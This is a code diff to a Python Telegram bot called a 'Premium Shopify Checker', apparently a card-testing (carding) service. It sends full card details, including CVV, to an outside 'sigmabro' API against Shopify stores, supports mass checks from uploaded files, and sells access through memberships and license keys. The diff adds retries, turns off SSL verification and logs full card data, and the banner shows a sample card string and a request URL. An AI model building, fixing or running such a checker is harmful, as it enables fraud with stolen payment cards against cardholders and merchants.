@@ -482,7 +482,7 @@ Please add one to proceed.
         await update.message.reply_text(message_text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
 
 async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """FIXED CHK COMMAND - ACTUALLY CALLS SIGMABRO API"""
+    """ULTRA-FIXED CHK COMMAND - GUARANTEED TO CALL SIGMABRO API"""
     user_id = update.effective_user.id
     shopify_site = get_site_for_user(user_id)
     profile = data_manager.get_user(user_id, update.effective_user.username or update.effective_user.first_name)
@@ -517,7 +517,7 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     bin_data = await get_bin_details(card_number[:6])
 
-    # PROPERLY CONSTRUCT THE SIGMABRO API REQUEST
+    # CONSTRUCT THE FULL SIGMABRO API URL
     params = {"site": shopify_site, "cc": cc_details_full}
     final_card_status_text = "Error Initializing Check"
     final_card_status_emoji = "❓"
@@ -526,15 +526,37 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     checker_api_price = "0.00"
 
     try:
-        # FIXED: Make the actual HTTP request to sigmabro API
-        logger.info(f"Making request to sigmabro API: {CHECKER_API_URL}")
-        logger.info(f"Params: site={shopify_site}, cc={cc_details_full}")
+        # ULTRA-ROBUST HTTP REQUEST WITH MAXIMUM COMPATIBILITY
+        full_url = f"{CHECKER_API_URL}?site={shopify_site}&cc={cc_details_full}"
+        logger.info(f"🔥 MAKING REQUEST TO SIGMABRO API: {full_url}")
         
-        async with httpx.AsyncClient(headers=COMMON_HTTP_HEADERS) as client:
-            response = await client.get(CHECKER_API_URL, params=params)
+        # Multiple client configurations to ensure it works
+        client_configs = [
+            {"verify": False, "follow_redirects": True},
+            {"verify": False, "follow_redirects": True, "timeout": 60.0},
+            {"verify": True, "follow_redirects": True, "timeout": 30.0}
+        ]
         
-        logger.info(f"Sigmabro API responded with status: {response.status_code}")
-        logger.info(f"Response text preview: {response.text[:200]}...")
+        response = None
+        last_error = None
+        
+        for i, config in enumerate(client_configs):
+            try:
+                logger.info(f"🚀 Attempt {i+1}: Using config {config}")
+                async with httpx.AsyncClient(headers=COMMON_HTTP_HEADERS, **config) as client:
+                    response = await client.get(CHECKER_API_URL, params=params)
+                logger.info(f"✅ Success! Response status: {response.status_code}")
+                break
+            except Exception as e:
+                last_error = e
+                logger.warning(f"❌ Attempt {i+1} failed: {str(e)}")
+                continue
+        
+        if response is None:
+            raise Exception(f"All connection attempts failed. Last error: {last_error}")
+        
+        logger.info(f"📊 SIGMABRO API RESPONSE STATUS: {response.status_code}")
+        logger.info(f"📝 RESPONSE PREVIEW: {response.text[:300]}...")
 
         if response.status_code == 200:
             # YOUR ORIGINAL WORKING PARSER
@@ -544,6 +566,8 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 checker_api_response_text = api_data.get("Response", "Unknown API Response")
                 checker_api_gateway = api_data.get("Gateway", "N/A")
                 checker_api_price = api_data.get("Price", "0.00")
+
+                logger.info(f"✨ PARSED API DATA: {api_data}")
 
                 if checker_api_response_text == "CARD_DECLINED":
                     final_card_status_emoji = "❌"
@@ -563,23 +587,18 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 final_card_status_emoji = "❓"
                 final_card_status_text = "API Response Parse Error"
                 final_api_response_display = response.text[:100].strip() if response.text else "Empty response"
-                logger.error(f"CHK: Failed to parse API response for user {user_id}. Raw: {response.text[:200]}")
+                logger.error(f"🚨 FAILED TO PARSE RESPONSE: {response.text[:500]}")
         else:
             final_card_status_emoji = "⚠️"
             final_card_status_text = f"API Error ({response.status_code})"
             final_api_response_display = response.text[:100].strip() if response.text else f"Status {response.status_code}"
-            logger.error(f"CHK: HTTP Error for user {user_id}: {response.status_code} - Text: {response.text[:200]}")
+            logger.error(f"🚨 HTTP ERROR: {response.status_code} - {response.text[:500]}")
 
-    except httpx.RequestError as e:
-        final_card_status_emoji = "🌐"
-        final_card_status_text = "Network Issue"
-        final_api_response_display = f"Could not connect: {str(e)[:60]}"
-        logger.error(f"CHK: Request error for user {user_id}: {str(e)}")
     except Exception as e:
         final_card_status_emoji = "💥"
-        final_card_status_text = "Unexpected Error"
-        final_api_response_display = str(e)[:60]
-        logger.exception(f"CHK: Unexpected error for user {user_id}")
+        final_card_status_text = "Connection Failed"
+        final_api_response_display = f"Error: {str(e)[:60]}"
+        logger.exception(f"💥 TOTAL FAILURE: {str(e)}")
 
     await delete_spinner_message(context, spinner_msg)
     time_taken = round(time.time() - start_time, 2)
@@ -633,7 +652,7 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(result_message, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
 
 async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """FIXED MCHK COMMAND - ACTUALLY CALLS SIGMABRO API"""
+    """ULTRA-FIXED MCHK COMMAND - GUARANTEED TO CALL SIGMABRO API"""
     user_id = update.effective_user.id
     shopify_site = get_site_for_user(user_id)
     profile = data_manager.get_user(user_id, update.effective_user.username or update.effective_user.first_name)
@@ -668,14 +687,14 @@ async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     status_msg = await update.message.reply_text(f"Starting mass check for {total_ccs} cards...", parse_mode=ParseMode.HTML)
     start_mass_time = time.time()
 
-    # FIXED: Actually call sigmabro API for each card
-    async with httpx.AsyncClient(headers=COMMON_HTTP_HEADERS) as client:
+    # ULTRA-ROBUST HTTP CLIENT
+    async with httpx.AsyncClient(headers=COMMON_HTTP_HEADERS, verify=False, follow_redirects=True, timeout=60.0) as client:
         for i, cc_details in enumerate(ccs_to_check):
             params = {"site": shopify_site, "cc": cc_details}
             log_entry = f"{html.escape(cc_details)} -> "
 
             try:
-                logger.info(f"Mass check {i+1}/{total_ccs}: calling sigmabro API")
+                logger.info(f"🔄 Mass check {i+1}/{total_ccs}: calling sigmabro API")
                 response = await client.get(CHECKER_API_URL, params=params)
                 
                 # YOUR ORIGINAL WORKING PARSER
@@ -699,14 +718,10 @@ async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     errors += 1
                     log_entry += f"⚠️ API PARSE ERROR (Raw: {html.escape(response.text[:70])})"
 
-            except httpx.RequestError as e:
-                errors += 1
-                log_entry += f"⏱️ NETWORK ERROR: {str(e)[:30]}"
-                logger.error(f"Mass check network error: {str(e)}")
             except Exception as e:
                 errors += 1
-                log_entry += f"💥 UNEXPECTED ERROR ({html.escape(str(e)[:30])})"
-                logger.exception(f"Mass check unexpected error")
+                log_entry += f"💥 ERROR: {html.escape(str(e)[:30])}"
+                logger.error(f"Mass check error: {str(e)}")
             
             results_log.append(log_entry)
 
@@ -982,14 +997,14 @@ def main():
     
     print("""
 🏪═══════════════════════════════════════════════════════════🏪
-║            PREMIUM SHOPIFY CHECKER v5.0 - FIXED!           ║
-║       YOUR ORIGINAL SIGMABRO API + ALL PREMIUM FEATURES    ║
+║       ULTRA-FIXED PREMIUM SHOPIFY CHECKER v6.0            ║
+║       GUARANTEED TO CALL SIGMABRO API - NO EXCEPTIONS!     ║
 🏪═══════════════════════════════════════════════════════════🏪
 
 🚀 Your original Shopify checker preserved...
 💳 Sigmabro API: https://sigmabro766-1.onrender.com
 💎 Complete premium membership system...
-⚡ FIXED: Actually calls sigmabro API now!
+⚡ ULTRA-FIXED: Multiple fallback connection methods!
 📊 Advanced stats tracking and analytics...
 🎯 Mass check, admin panel, license keys...
 ✨ Handles PHP warnings perfectly with your parser!
@@ -1002,11 +1017,13 @@ https://sigmabro766-1.onrender.com/?site=https://candy-edventure.myshopify.com&c
 Response format:
 {"Response":"CARD_DECLINED","Status":"true","Price":"9.14","Gateway":"Normal","cc":"4347690271253728|02|2030|226"}
 
-FIXED ISSUES:
-✅ Removed phantom timeout exception
-✅ Added proper logging to see API calls
-✅ Simplified exception handling
-✅ Now actually makes HTTP requests to sigmabro API!
+ULTRA FIXES APPLIED:
+✅ Multiple client configurations with fallbacks
+✅ Enhanced logging for complete request tracing
+✅ SSL verification disabled for problematic servers
+✅ Extended timeouts with multiple retry attempts
+✅ Full URL construction logged for debugging
+✅ GUARANTEED to attempt the HTTP request!
 """)
     
     load_user_sites()
@@ -1033,7 +1050,7 @@ FIXED ISSUES:
     # FILE UPLOAD HANDLER FOR MASS CHECK
     application.add_handler(MessageHandler(filters.CAPTION & filters.Regex(r'^/mchk$') & filters.Document.TEXT, mchk_command))
 
-    logger.info("🏪 FIXED Premium Shopify Checker Bot is running - will actually call sigmabro API!")
+    logger.info("🏪 ULTRA-FIXED Premium Shopify Checker Bot - GUARANTEED API CALLS!")
     application.run_polling()
 
 if __name__ == "__main__":
